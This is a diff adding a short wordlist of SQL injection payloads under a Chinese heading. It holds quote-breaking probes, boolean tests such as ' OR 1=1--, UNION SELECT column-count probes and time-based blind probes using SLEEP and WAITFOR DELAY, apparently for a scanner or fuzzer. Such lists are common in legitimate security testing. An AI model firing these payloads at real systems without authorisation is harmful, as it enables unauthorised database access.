@@ -1,0 +1,14 @@
+# SQL注入Payload
+'
+"
+'
+"'
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
